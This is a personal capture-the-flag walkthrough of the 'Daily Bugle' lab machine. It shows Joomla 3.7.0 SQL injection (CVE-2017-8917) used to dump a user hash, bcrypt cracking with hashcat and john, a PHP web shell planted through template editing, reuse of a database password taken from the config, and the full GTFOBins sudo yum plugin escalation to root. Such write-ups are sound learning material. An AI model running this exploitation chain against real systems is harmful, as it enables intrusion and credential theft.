# Daily Bugle

<img src="bugle.png" width=200 height=200 alt="bugle">

## Enumeration

### Nmap

```
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbp89KqmXj7Xx84uhisjiT7pGPYepXVTr4MnPu1P4fnlWzevm6BjeQgDBnoRVhddsjHhI1k+xdnahjcv6kykfT3mSeljfy+jRc+2ejMB95oK2AGycavgOfF4FLPYtd5J97WqRmu2ZC2sQUvbGMUsrNaKLAVdWRIqO5OO07WIGtr3c2ZsM417TTcTsSh1Cjhx3F+gbgi0BbBAN3sQqySa91AFruPA+m0R9JnDX5rzXmhWwzAM1Y8R72c4XKXRXdQT9szyyEiEwaXyT0p6XiaaDyxT2WMXTZEBSUKOHUQiUhX7JjBaeVvuX4ITG+W8zpZ6uXUrUySytuzMXlPyfMBy8B
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKb+wNoVp40Na4/Ycep7p++QQiOmDvP550H86ivDdM/7XF9mqOfdhWK0rrvkwq9EDZqibDZr3vL8MtwuMVV5Src=
|   256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4TcvlwCGpiawPyNCkuXTK5CCpat+Bv8LycyNdiTJHX
80/tcp   open  http    syn-ack Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
| http-robots.txt: 15 disallowed entries
| /joomla/administrator/ /administrator/ /bin/ /cache/
| /cli/ /components/ /includes/ /installation/ /language/
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
|_http-title: Home
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: Joomla! - Open Source Content Management
3306/tcp open  mysql   syn-ack MariaDB (unauthorized)
```

### Ffuf

```
.htaccess               [Status: 403, Size: 211, Words: 15, Lines: 9]
administrator           [Status: 301, Size: 243, Words: 14, Lines: 8]
.htpasswd               [Status: 403, Size: 211, Words: 15, Lines: 9]
.hta                    [Status: 403, Size: 206, Words: 15, Lines: 9]
bin                     [Status: 301, Size: 233, Words: 14, Lines: 8]
cache                   [Status: 301, Size: 235, Words: 14, Lines: 8]
cgi-bin/                [Status: 403, Size: 210, Words: 15, Lines: 9]
components              [Status: 301, Size: 240, Words: 14, Lines: 8]
includes                [Status: 301, Size: 238, Words: 14, Lines: 8]
images                  [Status: 301, Size: 236, Words: 14, Lines: 8]
language                [Status: 301, Size: 238, Words: 14, Lines: 8]
layouts                 [Status: 301, Size: 237, Words: 14, Lines: 8]
libraries               [Status: 301, Size: 239, Words: 14, Lines: 8]
media                   [Status: 301, Size: 235, Words: 14, Lines: 8]
modules                 [Status: 301, Size: 237, Words: 14, Lines: 8]
index.php               [Status: 200, Size: 9280, Words: 441, Lines: 243]
plugins                 [Status: 301, Size: 237, Words: 14, Lines: 8]
robots.txt              [Status: 200, Size: 836, Words: 88, Lines: 33]
templates               [Status: 301, Size: 239, Words: 14, Lines: 8]
tmp                     [Status: 301, Size: 233, Words: 14, Lines: 8]
```

First hard machine

I know I may not be ready yet but I want to see how hard things can get irl

I will do this slowly and use other's walktrough writeups when needed

There is a login page in "administrator" directory

Its a joomla website but we need the version to search for vulnerabilities

googling "how to check joomla version" we get

`http://10.10.100.174/administrator/manifests/files/joomla.xml`

```
files_joomla Joomla! Project admin@joomla.org www.joomla.org (C) 2005 - 2017 Open Source Matters. All rights reserved GNU General Public License version 2 or later; see LICENSE.txt 3.7.0 April 2017 FILES_JOOMLA_XML_DESCRIPTION administrator/components/com_admin/script.php administrator/components/com_admin/sql/updates/mysql administrator/components/com_admin/sql/updates/sqlazure administrator/components/com_admin/sql/updates/sqlazure administrator/components/com_admin/sql/updates/postgresql administrator bin cache cli components images includes language layouts libraries media modules plugins templates tmp htaccess.txt web.config.txt LICENSE.txt README.txt index.php https://update.joomla.org/core/list.xml
```

Joomla 3.7.0

its seems to be vulnerable to sql injection `CVE-2017-8917`

the room suggests not using sqlmap but a python script

we google cve that-specific-cve script and TA-DAA we got a script (hard work lol)

For the sake of credits its: `joomblah` from stefanlucas (thanks)

this script works better with python2...I needed to install pip and requests to make it

```
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
python2 get-pip.py
python2 -m pip install requests
```

There is a python 3 version commited by mats-codes (commit #18) but its not complete fix

According to reddit:

```
Fix for the joomblah.py script Add .decode('utf-8') to the end of line 46 so it looks like this result += value.decode('utf-8')
```

Anyway I used the python 2 method and it works

```
└──╼ $python2 joomblah.py http://10.10.135.31/

.---. .-'''-. .-'''-.
| | ' _ \ ' _ \ .---.
'---' / /` '. \ / /` '. \ \_\_ ** \_** /| | | .
.---.. | \ ' . | \ ' | |/ `.' `. || | | .'|
| || ' | '| ' | '| .-. .-. '|| | | < |
| |\ \ / / \ \ / / | | | | | ||| ** | | ** | |
| | `. ` ..' / `. ` ..' / | | | | | |||/'** '. | | .:--.'. | | .'''-.
| | '-...-'` '-...-'` | | | | | ||:/` '. '| |/ | \ | | |/.'''. \ | | | | | | | ||| | || |`" ** | | | / | |
| | |**| |**| |**|||\ / '| | .'.''| | | | | |
**.' ' |/'..' / '---'/ / | |_| | | |
| ' ' `'-'` \ \._,\ '/| '. | '.
|\_\_\_\_.' `--' `" '---' '---'

[-] Fetching CSRF token
[-] Testing SQLi

- Found table: fb9j5_users
- Extracting users from fb9j5_users
  [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
- Extracting sessions from fb9j5_session
```

we get jonah creds but pass is hashed

lets identify the hash

```
$haiti '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
bcrypt [HC: 3200] [JtR: bcrypt]
Blowfish(OpenBSD) [HC: 3200] [JtR: bcrypt]
Woltlab Burning Board 4.x
```

BCRYPT??? Oh lord this is why its a hard room

Its gonna take years for me

```
hashcat -a 0 -m 3200 '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' /usr/share/wordlists/rockyou.txt
```

By God this is painful...I hash at 13H/s...I can't go through rockyou with that...the machine only lasts 1 hour for me (free)

Even with john its slow and takes forever`

```
$john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
0g 0:00:01:13 0,02% (ETA: 2021-11-15 23:37) 0g/s 38.93p/s 38.93c/s 38.93C/s skater1..firefly
```

ETA is in 5 days!! 5 fricking daaays XD

I had to look for a writeup that had the answer (close it after you get the pass to limit spoilers)

`jonah : spiderman123`

We use those at administrator page and login

immediately look for extensions, plugins or templates pages for uploads or custom code possibilty

in extensions/templates there are 2 templates we can customize

we cant upload directly so we have to modify a page or create one

I created `shell.php` (what a discrete name)

my activation subdir is `/templates/beez3/shell.php`

I visit that and get access on netcat

ugly shell evolves into better TTY

```
sh-4.2$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
bash-4.2$
```

we can't get user flag yet

```
cd jjameson
bash: cd: jjameson: Permission denied
```

let's check the website directory for creds..as there is a mysql db..the php files might help

`cat configuration.php`

```
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'The Daily Bugle';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'root';
        public $password = 'nv5uz9r3ZEDzVjNu';
        public $db = 'joomla';
        public $dbprefix = 'fb9j5_';
        public $live_site = '';
        public $secret = 'UAMBRWzHO3oFPmVC';
        public $gzip = '0';
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
        public $ftp_host = '127.0.0.1';
        public $ftp_port = '21';
        public $ftp_user = '';
        public $ftp_pass = '';
        public $ftp_root = '';
        public $ftp_enable = '0';
        public $offset = 'UTC';
        public $mailonline = '1';
        public $mailer = 'mail';
        public $mailfrom = 'jonah@tryhackme.com';
        public $fromname = 'The Daily Bugle';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = '0';
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = '25';
        public $caching = '0';
        public $cache_handler = 'file';
        public $cachetime = '15';
        public $cache_platformprefix = '0';
        public $MetaDesc = 'New York City tabloid newspaper';
        public $MetaKeys = '';
        public $MetaTitle = '1';
        public $MetaAuthor = '1';
        public $MetaVersion = '0';
        public $robots = '';
        public $sef = '1';
        public $sef_rewrite = '0';
        public $sef_suffix = '0';
        public $unicodeslugs = '0';
        public $feed_limit = '10';
        public $feed_email = 'none';
        public $log_path = '/var/www/html/administrator/logs';
        public $tmp_path = '/var/www/html/tmp';
        public $lifetime = '15';
        public $session_handler = 'database';
        public $shared_session = '0';
```

Maybe jjameson use the same pass for system (and maybe ssh too...)

`jjameson : nv5uz9r3ZEDzVjNu`

```
su jjameson
Password: nv5uz9r3ZEDzVjNu

[jjameson@dailybugle html]$
```

now we are good
`cat user.txt`

## Privilege Escalation

further privileges are required...let's evolve again

```
sudo -l
Matching Defaults entries for jjameson on dailybugle:
!visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
(ALL) NOPASSWD: /usr/bin/yum
```

Ah yes..the description said something about yum..let's ask gtfobins real quick

He said this:

```
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

wise words indeed

```
sh-4.2# id
uid=0(root) gid=0(root) groupes=0(root)
```

Actually just copy-pasting that works

what this does is basically craft a yum plugin that spawn a shell and enable/load the custom plugin

Alternatively you can craft the plugin on your own side then upload it (see gtfobins again)

Anyway we are done here

```
sh-4.2# cd /root
sh-4.2# ls
anaconda-ks.cfg  root.txt
sh-4.2# cat root.txt
```

This was amazing...I think the main thing that made this HARD is the Bcrypt hash

that single step I could not overcome alone...my computer and internet were both not good enough

But I think by optimizing my wordlists and creating specific and targeted ones I can bruteforce that

By exemple knowing jonah his password could be anything like..'jonah', 'peter', 'jameson', 'dailybugle','spiderman'...

All that mixed with numbers and special chars

But we all know what his biggest obsession is

Dammit peter get him those pictures
